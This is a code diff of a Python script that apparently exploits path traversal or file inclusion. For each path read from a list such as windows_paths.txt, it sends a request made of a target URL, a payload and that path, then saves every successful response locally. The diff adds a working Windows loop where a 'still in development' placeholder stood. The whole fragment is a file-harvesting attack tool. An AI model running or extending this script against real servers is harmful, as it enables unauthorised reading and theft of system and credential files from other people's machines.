@@ -29,7 +29,7 @@ if os == 1:
       print (r.status_code)
       if r.status_code == 200:
           name = line.replace("/","-")
-          file = open(output_dir+name+".txt", "w+")
+          file = open(output_dir+"/"+name, "w+")
           file.write(str(r.text))
           file.close()
       else:
@@ -40,5 +40,19 @@ if os == 1:
 
 else:
     files = open('./windows_paths.txt')
-    print("en desarrollo xD")
-
+    while(True):
+      line = files.readline()
+      line = line.replace('\n','')
+      r = requests.get(urlpath+payload+"/"+line)
+      print (r.url)
+      print (r.status_code)
+      if r.status_code == 200:
+          name = line.replace("/","-")
+          file = open(output_dir+"/"+name, "w+")
+          file.write(str(r.text))
+          file.close()
+      else:
+          print("not ok")
+      if not line:
+          break
+    files.close()
